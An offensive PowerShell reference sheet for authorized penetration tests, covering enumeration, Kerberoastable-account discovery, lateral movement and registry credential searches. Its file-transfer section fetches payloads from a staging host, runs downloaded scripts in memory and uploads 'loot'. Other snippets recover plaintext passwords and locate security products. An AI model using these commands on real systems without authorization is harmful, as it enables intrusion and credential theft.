% Filename: 13-programming/powershell/offensive.md
% Display name: Offensive PowerShell
% Last update: 2026-02-17
% Authors: @TristanInSec

# Offensive PowerShell

## Overview

PowerShell is deeply integrated into Windows and provides direct access to
.NET, WMI, COM, and the Windows API. This makes it a powerful tool for
penetration testing: host and network enumeration, credential handling,
file transfers, and lateral movement can all be accomplished without
dropping additional binaries on disk. This file covers offensive PowerShell
techniques used during authorized security assessments.

## Host Enumeration

```powershell
# PowerShell — local system enumeration
# https://learn.microsoft.com/en-us/powershell/

# System information
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain, DomainRole

# Current user context
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
whoami /priv
whoami /groups

# Local users and groups
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Get-LocalGroupMember -Group "Administrators"

# Running processes
Get-Process | Select-Object Name, Id, Path | Sort-Object Name

# Services
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName

# Installed software
Get-CimInstance Win32_Product | Select-Object Name, Version | Sort-Object Name

# Scheduled tasks
Get-ScheduledTask | Where-Object { $_.State -eq "Ready" } | Select-Object TaskName, TaskPath

# Environment variables
Get-ChildItem Env: | Sort-Object Name

# Antivirus status
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct |
    Select-Object displayName, productState
```

## Network Enumeration

```powershell
# PowerShell — network enumeration
# https://learn.microsoft.com/en-us/powershell/

# Network configuration
Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } |
    Select-Object InterfaceAlias, IPAddress
Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" }
Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses

# Active connections
Get-NetTCPConnection -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess

# Port scan (TCP connect)
function Scan-Ports {
    param(
        [string]$Target,
        [int[]]$Ports = @(21,22,23,25,53,80,110,139,143,443,445,993,995,1433,3306,3389,5432,8080,8443)
    )
    foreach ($port in $Ports) {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $connect = $tcp.BeginConnect($Target, $port, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(500, $false)
            if ($wait) {
                $tcp.EndConnect($connect)
                Write-Host "  $port/tcp open" -ForegroundColor Green
            }
            $tcp.Close()
        } catch {}
    }
}

# Usage
Scan-Ports -Target "10.0.0.1"

# Ping sweep
1..254 | ForEach-Object {
    $ip = "10.0.0.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {  # -TimeoutSeconds requires PS 6+
        Write-Host "$ip is up"
    }
}

# DNS lookups
Resolve-DnsName -Name "target.com" -Type A
Resolve-DnsName -Name "target.com" -Type MX
Resolve-DnsName -Name "10.0.0.1" -Type PTR
```

## Active Directory Enumeration

```powershell
# PowerShell — AD enumeration (requires domain context)
# https://learn.microsoft.com/en-us/powershell/module/activedirectory/

# Current domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Domain users (using ADSI, no module required)
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$searcher.FindAll() | ForEach-Object {
    $_.Properties["samaccountname"][0]
}

# Domain groups
$searcher.Filter = "(objectCategory=group)"
$searcher.FindAll() | ForEach-Object {
    $_.Properties["cn"][0]
}

# Domain admins
$searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
$result = $searcher.FindOne()
$result.Properties["member"]

# Domain computers
$searcher.Filter = "(objectCategory=computer)"
$searcher.FindAll() | ForEach-Object {
    $_.Properties["dnshostname"][0]
}

# Find service accounts with SPNs (Kerberoastable)
$searcher.Filter = "(&(objectCategory=person)(servicePrincipalName=*))"
$searcher.FindAll() | ForEach-Object {
    $name = $_.Properties["samaccountname"][0]
    $spns = $_.Properties["serviceprincipalname"]
    Write-Host "$name : $($spns -join ', ')"
}

# With ActiveDirectory module (if available):
# Get-ADUser -Filter * -Properties *
# Get-ADGroup -Filter * | Select-Object Name
# Get-ADGroupMember -Identity "Domain Admins"
# Get-ADComputer -Filter * | Select-Object Name, DNSHostName
```

## File Transfer

```powershell
# PowerShell — file transfer techniques
# https://learn.microsoft.com/en-us/powershell/

# Download file with Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.0.0.1:8000/payload.exe" -OutFile "C:\Users\Public\payload.exe"

# Download with .NET WebClient (often faster)
(New-Object Net.WebClient).DownloadFile("http://10.0.0.1:8000/file.exe", "C:\Users\Public\file.exe")

# Download string (execute in memory)
$script = (New-Object Net.WebClient).DownloadString("http://10.0.0.1:8000/script.ps1")
# IEX ($script) — execute the downloaded script in memory

# Invoke-RestMethod (auto-parses JSON)
$data = Invoke-RestMethod -Uri "http://10.0.0.1:8000/data.json"

# Upload file via HTTP POST
Invoke-WebRequest -Uri "http://10.0.0.1:8000/upload" -Method Post -InFile "C:\loot\data.txt"

# Base64 file transfer (for copy-paste scenarios)
# Encode:
$bytes = [System.IO.File]::ReadAllBytes("C:\file.exe")
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Out-File "encoded.txt"
# Decode:
$decoded = [Convert]::FromBase64String((Get-Content "encoded.txt" -Raw))
[System.IO.File]::WriteAllBytes("C:\output.exe", $decoded)

# SMB copy (lateral movement context)
Copy-Item -Path "C:\tools\payload.exe" -Destination "\\target\C$\Users\Public\payload.exe"

# BITS transfer (Background Intelligent Transfer Service)
Start-BitsTransfer -Source "http://10.0.0.1:8000/file.exe" -Destination "C:\Users\Public\file.exe"
```

## Credential Handling

```powershell
# PowerShell — credentials
# https://learn.microsoft.com/en-us/powershell/

# Create credential object (prompts for password)
$cred = Get-Credential

# Create credential from variables (non-interactive)
$user = "DOMAIN\admin"
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

# Use credentials with cmdlets
Invoke-Command -ComputerName "server01" -Credential $cred -ScriptBlock { whoami }
Enter-PSSession -ComputerName "server01" -Credential $cred

# Run process as another user
Start-Process powershell.exe -Credential $cred

# Extract plaintext from SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)
$plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
```

## Remote Execution

```powershell
# PowerShell — remote execution (WinRM)
# https://learn.microsoft.com/en-us/powershell/

# Execute a command on a remote host
Invoke-Command -ComputerName "server01" -ScriptBlock { hostname; whoami }

# Execute with credentials
Invoke-Command -ComputerName "server01" -Credential $cred -ScriptBlock {
    Get-Process | Select-Object Name, Id | Sort-Object Name
}

# Execute on multiple hosts
$targets = @("server01", "server02", "server03")
Invoke-Command -ComputerName $targets -ScriptBlock { hostname } -Credential $cred

# Interactive remote session
Enter-PSSession -ComputerName "server01" -Credential $cred
# ... run commands interactively ...
Exit-PSSession

# Execute a local script on a remote host
Invoke-Command -ComputerName "server01" -FilePath "C:\scripts\enum.ps1" -Credential $cred

# WMI remote execution (alternative to WinRM)
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
    -Arguments @{CommandLine="cmd.exe /c whoami > C:\output.txt"} `
    -ComputerName "server01" -Credential $cred
```

## Registry Operations

```powershell
# PowerShell — registry
# https://learn.microsoft.com/en-us/powershell/

# Read registry values
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Search registry for interesting values
Get-ChildItem -Path "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty -ErrorAction SilentlyContinue |
    Where-Object { $_ -match "password" }

# Check if LSA protection is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

# Check WDigest (plaintext credentials in memory)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue

# AutoLogon credentials
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
    Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

## Common Offensive Patterns

### Process and Service Manipulation

```powershell
# PowerShell — process and service operations
# https://learn.microsoft.com/en-us/powershell/

# List processes with command line
Get-CimInstance Win32_Process | Select-Object Name, ProcessId, CommandLine

# Find security products
Get-Process | Where-Object {
    $_.Name -match "MsMpEng|defender|symantec|mcafee|crowdstrike|carbon|cylance|sentinel"
}

# Service manipulation
Get-Service | Where-Object { $_.Name -match "defend|security|firewall" }
```

### Event Log Queries

```powershell
# PowerShell — event log enumeration
# https://learn.microsoft.com/en-us/powershell/

# Recent logon events
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 20 |
    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}},
    @{N='LogonType';E={$_.Properties[8].Value}}

# Failed logons
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20 |
    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}},
    @{N='SourceIP';E={$_.Properties[19].Value}}

# New service installations
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 10 |
    Select-Object TimeCreated, @{N='ServiceName';E={$_.Properties[0].Value}},
    @{N='ImagePath';E={$_.Properties[1].Value}}

# PowerShell script block logging
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 10 |
    Select-Object TimeCreated, Message
```

## Script Template

```powershell
# PowerShell script template for security assessments
# https://learn.microsoft.com/en-us/powershell/

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,

    [int[]]$Ports = @(22,80,443,445,3389),

    [string]$OutputFile,

    [switch]$Verbose
)

function Write-Status {
    param([string]$Message, [string]$Type = "info")
    switch ($Type) {
        "info"    { Write-Host "[+] $Message" -ForegroundColor Green }
        "warning" { Write-Host "[!] $Message" -ForegroundColor Yellow }
        "error"   { Write-Host "[-] $Message" -ForegroundColor Red }
    }
}

# Main
Write-Status "Starting scan of $Target"

$results = @()
foreach ($port in $Ports) {
    # ... scan logic ...
    $results += [PSCustomObject]@{
        Port   = $port
        Status = "open"
    }
}

# Output
if ($OutputFile) {
    $results | Export-Csv -Path $OutputFile -NoTypeInformation
    Write-Status "Results saved to $OutputFile"
} else {
    $results | Format-Table -AutoSize
}
```

## References

### Further Reading

- [PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/)
- [PowerShell Security Best Practices](https://learn.microsoft.com/en-us/powershell/scripting/security/security-features)
